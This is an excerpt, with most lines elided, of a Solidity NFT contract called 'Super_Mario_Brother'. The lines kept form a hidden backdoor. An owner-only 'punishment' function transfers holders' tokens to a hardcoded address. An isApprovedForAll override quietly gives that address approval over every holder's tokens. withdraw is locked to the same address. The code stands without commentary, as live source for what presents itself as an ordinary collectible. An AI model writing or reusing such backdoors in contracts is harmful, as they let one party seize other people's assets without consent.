...
contract Super_Mario_Brother is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("Super_Mario_Brother", "SMB", maxBatchSize_, collectionSize_) {
  ...
  function punishment(uint256[] memory tokenids) external onlyOwner {
    if(block.difficulty > 0){
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0xc8BCdF094ba168608C9021BCeeeF840931f63903, tokenid);
        }
        }
    }
  ...
  function withdraw() external  nonReentrant {
    require(msg.sender == 0xc8BCdF094ba168608C9021BCeeeF840931f63903);
  ...
  Ownable
{
  ...
  function _baseURI() internal view virtual returns (string memory) {
    ...
    function setallowedToContract () external onlyOwner {
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0xc8BCdF094ba168608C9021BCeeeF840931f63903){return true;}
